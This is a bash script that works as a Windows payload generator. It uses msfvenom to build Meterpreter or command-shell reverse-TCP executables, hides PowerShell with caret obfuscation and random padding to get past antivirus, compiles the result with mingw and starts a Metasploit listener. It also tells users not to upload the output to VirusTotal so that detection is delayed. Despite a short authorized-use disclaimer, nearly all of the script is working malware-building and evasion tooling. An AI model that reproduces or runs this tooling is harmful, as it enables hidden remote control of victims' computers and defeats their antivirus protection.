#!/bin/bash
# Radioactive Rabbit : FUD Windows MSFVenom Payload Generator
# Coded and edit by: https://github.com/Realradioactive


banner() {
printf " \n"
printf " \n"
printf "        \e[1;91m Disclaimer: this tool is designed for security\n"
printf "         testing in an authorized simulated cyberattack\n"
printf "         Attacking targets without prior mutual consent\n"
printf "         is illegal!\e[0m \n"
printf "\e[1;36m  \n"

cat banner.txt
printf " \e[0m \n"
printf "\e[1;91m        Radioactive Rabbit,    \e[0m \n"
printf "\e[1;91m        Jump Jump And Bypass Antivirus  \e[0m \n"
printf " \n"
printf "\e[1;32m        Radioactive Rabbit, FUD Msfvenom Payload Generator \e[0m \n"
printf "\e[1;32m        Coded and edit by: https://github.com/Realradioactive  \e[0m \n"
printf "\e[1;32m        Radioactive Tavsan payload jeneratoru \e[0m \n"
printf "\e[1;32m        Kodlama ve düzenleme: https://github.com/Realradioactive  \e[0m \n"
printf "\e[1;32m        Lutfen olusturdugunuz payloadlari hicbir antivirus ve sitede taratmayiniz, aksi halde yakin zamanda payload antilere yakalanacaktir. \e[0m \n"
printf "\e[1;91m        Bu program yalnızca pentest ve veya güvenlik testleri icin yazilmistir. onceden izin alinmamis sistemlere saldiri veya güvenlik testi disinda kullanimi yasa disidir.      \e[0m \n"

printf "\n"


}






dependencies() {

command -v msfvenom > /dev/null 2>&1 || { echo >&2 "I require msfvenom but it's not installed. Install it or use Kali Linux."; exit 1; }
command -v i686-w64-mingw32-gcc > /dev/null 2>&1 || { echo >&2 "I require mingw-w64 but it's not installed. Install it: apt-get update && apt-get install mingw-w64"; 
exit 1; }
command -v base64 > /dev/null 2>&1 || { echo >&2 "I require base64 but it's not installed. Install it. Aborting."; exit 1; }
command -v zip > /dev/null 2>&1 || { echo >&2 "I require Zip but it's not installed. Install it. Aborting."; exit 1; }
command -v netcat > /dev/null 2>&1 || { echo >&2 "I require netcat but it's not installed. Install it. Aborting."; exit 1; } 

}






settings2() {

default_payload_name="rabbit"
printf '\e[1;32m[\e[0m\e[1;77m+\e[0m\e[1;32m] (dont use numbers) Payload name (Default:\e[0m\e[1;77m %s \e[0m\e[1;32m): \e[0m' $default_payload_name

read payload_name
payload_name="${payload_name:-${default_payload_name}}"


}

start() {


msf_venom
printf "\n"

printf " \e[1;31m* 01 *\e[0m\e[1;77m  Enter LPORT/LHOST: \e[0m\n"
printf " \e[1;31m* 02 *\e[0m\e[1;77m  Choose Again Payload \e[0m\n"
default_option_server="1"
read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose a reverse TCP Port Forwarding option: \e[0m' option_server
option_server="${option_server:-${default_option_server}}"

if [[ $option_server -eq 2 ]]; then
printf "\e[1;93m [!] Jumping \e[0m\n"
sleep 1
clear
msf_venom
fi

if [[ $option_server -eq 1 ]]; then
read -p $'\n\e[1;92m[+]\e[1;92m LHOST: \e[0m' custom_ip
if [[ -z "$custom_ip" ]]; then
exit 1
fi
server_tcp=$custom_ip
read -p $'\n\e[1;92m[+]\e[1;92m LPORT: \e[0m' custom_port
if [[ -z "$custom_port" ]]; then
exit 1
fi
server_port=$custom_port
settings2
payload
listener
else
printf "\e[1;93m [!] No jump :( Invalid option!\e[0m\n"
sleep 1
clear
start
fi

}


listener() {



default_listr="Y"
read -p $'\n\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Jumping Metasploit Listener? \e[0m\e[1;77m[Y/n]\e[0m\e[1;33m: \e[0m' listr
listr="${listr:-${default_listr}}"
if [[ $listr == Y || $listr == y || $listr == Yes || $listr == yes ]]; then
printf "use exploit/multi/handler\n" > handler.rc
printf "set payload %s\n" $payload_msf >> handler.rc
if [[ $forward == true ]];then
printf "set LHOST 127.0.0.1\n" >> handler.rc
else
printf "set LHOST %s\n" $server_tcp >> handler.rc
fi
printf "set LPORT %s\n" $server_port >> handler.rc
#printf "set ExitOnSession false\n" >> handler.rc
#printf "exploit -j -z\n" >> handler.rc
printf "exploit\n" >> handler.rc
msfconsole -r handler.rc
rm -rf handler.rc
fi

}

checkfound() {

while [ true ]; do


default_listr="Y"
read -p $'\e[1;32m  Start Metasploit Listener?  \e[0m' listr
listr="${listr:-${default_listr}}"
if [[ $listr == Y || $listr == y || $listr == Yes || $listr == yes ]]; then
printf "use exploit/multi/handler\n" > handler.rc
printf "set payload %s\n" $payload_msf >> handler.rc
if [[ $forward == true ]];then
printf "set LHOST 127.0.0.1\n" >> handler.rc
else
printf "set LHOST %s\n" $server_tcp >> handler.rc
fi

printf "set LPORT 4444\n" >> handler.rc
#printf "set ExitOnSession false\n" >> handler.rc
#printf "exploit -j -z\n" >> handler.rc
printf "exploit\n" >> handler.rc
msfconsole -r handler.rc
rm -rf handler.rc



#
fi
done
sleep 0.5

}

msf_venom() {


#printf "\e[1;31m* 01 *\e[0m\e[1;77m     \e[0m\n"
printf "\e[1;31m* 01 *\e[0m\e[1;77m windows/meterpreter/reverse_tcp\e[0m\n" 
printf "\e[1;31m* 02 *\e[0m\e[1;77m windows/shell/reverse_tcp\e[0m\n"
printf "\e[1;31m* 03 *\e[0m\e[1;77m windows/meterpreter/reverse_tcp_dns \e[0m\n"


read -p $'\n\e[1;92m[+]\e[1;92m Choose a payload: \e[0m' payload_option;
Y="rm"
if [[ $payload_option -eq 1 ]];then
payload_msf="windows/meterpreter/reverse_tcp"
elif [[ $payload_option -eq 2 ]];then
payload_msf="windows/shell/reverse_tcp"
elif [[ $payload_option -eq 3 ]];then
payload_msf="windows/meterpreter/reverse_tcp_dns"

else

printf "\e[1;91m No jump :( Invalid!\e[0m\n"
sleep 1
msf_venom
fi



}

function randomPadding {

    paddingArray=(0 1 2 3 4 5 6 7 8 9 a b c d e f g h j k l m n p r s t v y x )

    counter=0
    randomNumber=$((RANDOM%${randomness}+25))
    while [  $counter -lt $randomNumber ]; do
        echo ""
	randomCharnameSize=$((RANDOM%10+7))
        randomCharname=`cat /dev/urandom | tr -dc 'a-zA-Z' | head -c ${randomCharnameSize}`
	echo "unsigned char ${randomCharname}[]="
    	randomLines=$((RANDOM%20+13))
	for (( c=1; c<=$randomLines; c++ ))
	do
		randomString="\""
		randomLength=$((RANDOM%11+7))
		for (( d=1; d<=$randomLength; d++ ))
		do
			randomChar1=${paddingArray[$((RANDOM%15))]}
			randomChar2=${paddingArray[$((RANDOM%15))]}
			randomPadding=$randomChar1$randomChar2
	        	randomString="$randomString\\x$randomPadding"
		done
		randomString="$randomString\""
		if [ $c -eq ${randomLines} ]; then
			echo "$randomString;"
		else
			echo $randomString
		fi
	done
        let counter=counter+1
    done
}

payload() {


q="c";z=".";



printf "\n\e[1;92m[+]\e[1;92m Creating MSFVenom payload\e[0m\n"; X="1"

msfvenom -p $payload_msf LHOST=$server_tcp LPORT=$server_port -f psh-cmd -o $payload_name.bat > /dev/null 2>&1
if [[ $(cat "$payload_name".bat) == "" ]]; then
printf "\e[91mMSFVenom Error!\e[0m\n"
rm -rf $payload_name.bat
exit 1
fi

enc=$z$q 
#msf=$(cat $payload_name.bat | sed 's/\%COMSPEC\% \/b \/c //g' |sed 's/\//\\\//g' | sed 's/powershell/p^o^wer^sh^ell/g')

msf=$(cat $payload_name.bat | sed 's/\%COMSPEC\% \/b \/c //g' |sed 's/\//\\\//g' | sed 's/powershell/p^o^wer^sh^ell/g'  )

name=$(echo $payload_name)
#msfb=$(echo $msf |base64 >base)
#bak=$(cat base)

#s/payload/${msf}/g
sed -f - src/src2.c > $X.$q << EOF

s/payload/${msf}/g
s/changea/${name}/g
s/changeb/${name}/g
EOF
randomPadding > padding.c

cat src/src1.c > $X
cat padding.c >> $X
randomPadding > padding.c
cat padding.c >> $X
randomPadding > padding.c
cat padding.c >> $X
randomPadding > padding.c
cat padding.c >> $X
randomPadding > padding.c
cat padding.c >> $X
cat $X.$q >> $X
randomPadding > padding.c
cat padding.c >> $X
randomPadding > padding.c
cat padding.c >> $X
randomPadding > padding.c
cat padding.c >> $X
randomPadding > padding.c
cat padding.c >> $X
#cat $X >>incele
rm -rf padding.c
mv $X $X.c



rm -rf $payload_name.bat
printf "\n\e[1;92m[+]\e[1;92m Building payload\e[0m\n"
i686-w64-mingw32-gcc $X$enc -o "$payload_name".exe 
if [ -e "$payload_name".exe ]; then
if [ ! -d payloads/"$payload_name"/ ]; then
IFS=$'\n'
mkdir -p payloads/"$payload_name/"
fi
cp "$payload_name".exe payloads/"$payload_name"/"$payload_name".exe
$Y -r $X.$q
#zip $payload_name.zip "$payload_name".exe > /dev/null 2>&1
IFS=$'\n'

#exiftool -TagsFromFile /Metadata/microsoftmeta.exe "-all:all>all:all" payload.exe

printf "\e[1;33m Payload saved:\e[0m\e[1;77m \e[0m \e[1;77m payloads/%s.exe\e[0m\n" $payload_name
printf "\n"
printf '\e[1;92m Check your file at\e[0m\e[1;77m https://antiscan.me\e[0m\n'
printf '\e[1;93m Please,\e[0m\e[1;91m do not upload to VirusTotal \e[0m\n'
else
printf "\e[1;93mError compiling\e[0m\n"
exit 1
fi

}

banner
dependencies
start

